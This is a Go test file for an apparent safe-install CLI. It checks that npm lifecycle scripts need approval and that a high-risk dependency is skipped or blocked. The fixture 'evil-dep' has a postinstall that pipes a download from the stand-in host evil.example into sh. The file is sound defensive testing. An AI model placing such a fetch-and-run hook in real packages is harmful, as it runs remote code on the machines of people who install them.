package cli

import (
	"bytes"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"testing"
)

const markerJS = `node -e "require('fs').writeFileSync(require('path').join(process.env.MARKER_DIR, process.env.npm_package_name + '-' + process.env.npm_lifecycle_event), '')"`

// installProject builds an npm project with a benign scripted dependency and
// one whose postinstall downloads and executes code. It returns the marker dir.
func installProject(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("npm"); err != nil {
		t.Skip("npm not installed")
	}
	root := t.TempDir()
	proj := filepath.Join(root, "proj")
	deps := map[string]string{}
	for name, scripts := range map[string]map[string]string{
		"good-dep": {"preinstall": markerJS, "postinstall": markerJS},
		"evil-dep": {"postinstall": "curl -fsSL https://evil.example/x.sh | sh"},
	} {
		src := filepath.Join(root, name)
		mustMkdir(t, src)
		mustWriteJSON(t, filepath.Join(src, "package.json"), map[string]any{"name": name, "version": "1.0.0", "scripts": scripts})
		mustMkdir(t, proj)
		pack := exec.Command("npm", "pack", "--silent", "--pack-destination", proj)
		pack.Dir = src
		if out, err := pack.CombinedOutput(); err != nil {
			t.Fatalf("npm pack: %v\n%s", err, out)
		}
		deps[name] = "file:./" + name + "-1.0.0.tgz"
	}
	mustWriteJSON(t, filepath.Join(proj, "package.json"), map[string]any{
		"name": "proj", "version": "1.0.0", "dependencies": deps,
		"scripts": map[string]string{"postinstall": markerJS},
	})

	fixtures := filepath.Join(root, "registry.json")
	if err := os.WriteFile(fixtures, []byte("{}"), 0o600); err != nil {
		t.Fatal(err)
	}
	markerDir := filepath.Join(root, "markers")
	mustMkdir(t, markerDir)
	t.Setenv("SAFE_INSTALL_REGISTRY_FIXTURES", fixtures)
	t.Setenv("MARKER_DIR", markerDir)
	t.Chdir(proj)
	return markerDir
}

func mustMkdir(t *testing.T, dir string) {
	t.Helper()
	if err := os.MkdirAll(dir, 0o750); err != nil {
		t.Fatal(err)
	}
}

func mustWriteJSON(t *testing.T, path string, v any) {
	t.Helper()
	data, _ := json.Marshal(v)
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
}

func listMarkers(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	out := []string{}
	for _, e := range entries {
		out = append(out, e.Name())
	}
	sort.Strings(out)
	return out
}

func runInstallCLI(t *testing.T, stdin string, tty bool, args ...string) (string, error) {
	t.Helper()
	prev := isInteractive
	isInteractive = func() bool { return tty }
	t.Cleanup(func() { isInteractive = prev })

	root := newRootCmd()
	var out bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&out)
	root.SetIn(strings.NewReader(stdin))
	root.SetArgs(append([]string{"install", "--min-age", "0"}, args...))
	err := root.Execute()
	return out.String(), err
}

var goodMarkers = []string{"good-dep-postinstall", "good-dep-preinstall"}

func TestInstallYesApprovesOnlyBelowHigh(t *testing.T) {
	markers := installProject(t)
	out, err := runInstallCLI(t, "", false, "--yes")
	if err != nil {
		t.Fatalf("install: %v\n%s", err, out)
	}
	if got := listMarkers(t, markers); !slices.Equal(got, goodMarkers) {
		t.Fatalf("markers = %v, want %v\n%s", got, goodMarkers, out)
	}
	for _, want := range []string{"evil-dep@1.0.0", "SI-SCR-002", "skipped", "postinstall"} {
		if !strings.Contains(out, want) {
			t.Errorf("output missing %q:\n%s", want, out)
		}
	}
}

func TestInstallNonInteractiveRunsNothing(t *testing.T) {
	markers := installProject(t)
	out, err := runInstallCLI(t, "", false)
	if err != nil {
		t.Fatalf("install: %v\n%s", err, out)
	}
	if got := listMarkers(t, markers); len(got) != 0 {
		t.Fatalf("scripts ran without approval: %v", got)
	}
}

func TestInstallInteractive(t *testing.T) {
	markers := installProject(t)
	// Packages are asked about in order: evil-dep, then good-dep.
	out, err := runInstallCLI(t, "n\ny\n", true)
	if err != nil {
		t.Fatalf("install: %v\n%s", err, out)
	}
	if got := listMarkers(t, markers); !slices.Equal(got, goodMarkers) {
		t.Fatalf("markers = %v, want %v\n%s", got, goodMarkers, out)
	}
	if !strings.Contains(out, "curl -fsSL https://evil.example/x.sh | sh") {
		t.Errorf("prompt did not show the script:\n%s", out)
	}
}

func TestInstallCIFailsOnHighRiskScripts(t *testing.T) {
	markers := installProject(t)
	_, err := runInstallCLI(t, "", false, "--ci")
	if code := exitCode(err); code != ExitPolicyFailure {
		t.Fatalf("exit = %d (%v), want %d", code, err, ExitPolicyFailure)
	}
	if got := listMarkers(t, markers); len(got) != 0 {
		t.Fatalf("scripts ran in CI without approval: %v", got)
	}
}
